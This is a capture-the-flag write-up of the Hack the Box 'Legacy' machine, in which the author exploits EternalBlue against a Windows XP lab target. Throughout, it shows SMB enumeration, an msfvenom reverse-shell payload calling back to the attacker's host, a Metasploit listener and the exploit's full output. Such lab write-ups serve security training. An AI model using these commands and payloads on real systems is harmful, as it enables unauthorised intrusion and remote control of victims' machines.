# Eternal Blue

We already had an exploit we could use from when we did [[Writeups/Hack the Box/Boxes/Blue/10 - Eternal Blue|Blue]].

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ cp ../blue/exploit.py .
```

The only thing we needed to potentially change was the username. I checked the `nmap` scan, and it showed no username was used to login.

I quickly tried connecting to port 445 to check this behaviour was correct. I wanted to list the shares so I knew which one to connect to, but all of the methods I tried gave a timeout error:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbclient -L \\10.10.10.4
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbclient -L 10.10.10.4 \\\\legacy\\shares
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
```

So I just tried connecting with `smbmap`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbmap -H 10.10.10.4 -u "" -p ""
[+] IP: 10.10.10.4:445	Name: 10.10.10.4                                        
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbmap -H 10.10.10.4 -u null -p ""
[!] Authentication error on 10.10.10.4
```

It looks like giving a literal blank username is what we want. So I edited `exploit.py`:

![[Pasted image 20210502103619.png]]

I also had to copy across `mysmb.py`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ cp ../blue/mysmb.py .
```

Then I needed a payload. I did a search for windows payloads to see if there were any specific Windows XP ones:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ msfvenom -l payload | grep windows
```

It looked like there weren't, so I went for the most generic one:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9001 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

I then edited the script to upload the new payload:

![[Pasted image 20210502104328.png]]

I then started a listener:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ msfconsole -q
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:9001 
```

I wanted to see if the exploit worked without selecting a named pipe in advance, as it seemed to have a method to find one. So I ran it just specifying the IP:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ python2 exploit.py 10.10.10.4
Target OS: Windows 5.1
Using named pipe: spoolss
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8209e3c8
SESSION: 0xe10af840
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe11ffcf8
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe11ffd98
overwriting token UserAndGroups
Opening SVCManager on 10.10.10.4.....
Creating service WtPn.....
Starting service WtPn.....
The NETBIOS connection with the remote host timed out.
Removing service WtPn.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

And I got a shell almost instantly:

![[Pasted image 20210502104816.png]]

It seems `whoami` wasn't a command on Windows XP. I tried:

```bash
C:\WINDOWS\system32>echo %USERNAME%
echo %USERNAME%
%USERNAME%
```

But got nothing. So I just went digging for the flags instead.

![[Pasted image 20210502105024.png]]

![[Pasted image 20210502105053.png]]

That's the box!

![[Pasted image 20210502105629.png]]

# Tags

#writeup #cve #windows #oscp-prep 